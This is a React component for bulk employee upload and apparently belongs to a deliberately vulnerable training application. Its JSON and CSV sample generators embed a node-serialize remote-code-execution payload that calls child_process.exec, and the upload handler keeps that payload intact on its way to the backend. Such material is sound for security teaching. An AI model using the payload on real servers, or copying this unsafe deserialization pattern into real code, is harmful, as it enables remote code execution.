import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon, UploadIcon, FileIcon, DownloadIcon, AlertTriangleIcon } from 'lucide-react';
import { toast } from 'sonner';

const BulkEmployeeUpload = () => {
  const [file, setFile] = useState<File | null>(null);
  const [jsonData, setJsonData] = useState<string>('');
  const [isUploading, setIsUploading] = useState(false);
  const [uploadResult, setUploadResult] = useState<string>('');

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (selectedFile) {
      setFile(selectedFile);
      
      // Read file content
      const reader = new FileReader();
      reader.onload = (event) => {
        try {
          const content = event.target?.result as string;
          setJsonData(content);
        } catch (error) {
          console.error('Error reading file:', error);
          toast.error('Error reading file', {
            description: 'The file could not be read. Please try again.'
          });
        }
      };
      reader.readAsText(selectedFile);
    }
  };

  const handleJsonChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setJsonData(e.target.value);
  };

  const handleUpload = async () => {
    if (!jsonData.trim()) {
      toast.error('No data to upload', {
        description: 'Please provide JSON data or upload a file.'
      });
      return;
    }

    setIsUploading(true);
    setUploadResult('');

    try {
      // Parse the JSON data from the textarea
      let parsedData;
      try {
        parsedData = JSON.parse(jsonData);
      } catch (err) {
        toast.error('Invalid JSON', { description: 'Please provide valid JSON data.' });
        setIsUploading(false);
        return;
      }

      // Process the metadata field for each employee to ensure proper serialization
      if (Array.isArray(parsedData)) {
        // If it's an array (most common case), process each employee
        parsedData = parsedData.map(employee => {
          if (employee && typeof employee.metadata === 'string') {
            try {
              // We don't parse metadata here to keep the RCE payload intact
              // Just ensure it's a proper string
              return {
                ...employee,
                // Make sure metadata is passed as a string to backend
                metadata: employee.metadata
              };
            } catch (err) {
              console.warn('Error processing metadata field', err);
              return employee;
            }
          }
          return employee;
        });
      }

      // Send the data to the API through the proxy
      const response = await fetch('/api/employees/bulk-upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(parsedData)
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || 'Failed to upload employees');
      }

      setUploadResult(JSON.stringify(result, null, 2));
      toast.success('Employees uploaded successfully', {
        description: `${result.inserted || 0} employees were added to the system.`
      });
    } catch (error) {
      console.error('Error uploading employees:', error);
      toast.error('Failed to upload employees', {
        description: error instanceof Error ? error.message : 'Unknown error'
      });
      setUploadResult(error instanceof Error ? error.message : 'Unknown error');
    } finally {
      setIsUploading(false);
    }
  };

  const downloadSampleJson = () => {
    const sampleData = [
      {
        name: 'John Doe',
        position: 'Software Engineer',
        department: 'Engineering',
        email: 'john.doe@example.com',
        phone: '555-123-4567',
        location: 'New York',
        hire_date: '2023-01-15',
        status: 'active',
        manager: 'Jane Smith',
        salary: 85000,
        bio: 'Full-stack developer with 5 years of experience.'
      },
      {
        name: 'Jane Smith',
        position: 'Product Manager',
        department: 'Product',
        email: 'jane.smith@example.com',
        phone: '555-987-6543',
        location: 'San Francisco',
        hire_date: '2022-06-10',
        status: 'active',
        manager: 'Michael Johnson',
        salary: 95000,
        bio: 'Experienced product manager with a background in UX design.'
      }
    ];

    // Create a vulnerable sample with serialized JavaScript code
    // This is intentionally vulnerable for educational purposes
    const vulnerableSample = {
      name: 'Malicious User',
      position: 'Hacker',
      department: 'Security',
      email: 'hack@example.com',
      phone: '555-000-0000',
      location: 'Remote',
      hire_date: '2023-01-01',
      status: 'active',
      manager: 'None',
      salary: 0,
      bio: 'This is a test.',
      // This is the vulnerable part - serialized JavaScript that will execute when deserialized
      metadata: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'dir\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
    };

    sampleData.push(vulnerableSample);

    const dataStr = JSON.stringify(sampleData, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,' + encodeURIComponent(dataStr);
    
    const downloadLink = document.createElement('a');
    downloadLink.setAttribute('href', dataUri);
    downloadLink.setAttribute('download', 'sample_employees.json');
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
  };

  const downloadSampleCsv = () => {
    const headers = ['name', 'position', 'department', 'email', 'phone', 'location', 'hire_date', 'status', 'manager', 'salary', 'bio', 'metadata'];
    
    const rows = [
      ['John Doe', 'Software Engineer', 'Engineering', 'john.doe@example.com', '555-123-4567', 'New York', '2023-01-15', 'active', 'Jane Smith', '85000', 'Full-stack developer with 5 years of experience.', ''],
      ['Jane Smith', 'Product Manager', 'Product', 'jane.smith@example.com', '555-987-6543', 'San Francisco', '2022-06-10', 'active', 'Michael Johnson', '95000', 'Experienced product manager with a background in UX design.', ''],
      ['Malicious User', 'Hacker', 'Security', 'hack@example.com', '555-000-0000', 'Remote', '2023-01-01', 'active', 'None', '0', 'This is a test.', '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'dir\', function(error, stdout, stderr) { console.log(stdout) });}()"}']
    ];
    
    const csvContent = [
      headers.join(','),
      ...rows.map(row => row.map(cell => `"${cell}"`).join(','))
    ].join('\n');
    
    const dataUri = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csvContent);
    
    const downloadLink = document.createElement('a');
    downloadLink.setAttribute('href', dataUri);
    downloadLink.setAttribute('download', 'sample_employees.csv');
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
  };

  return (
    <div className="space-y-4">
      {/* Rest of the component content */}
    </div>
  );
};

export default BulkEmployeeUpload;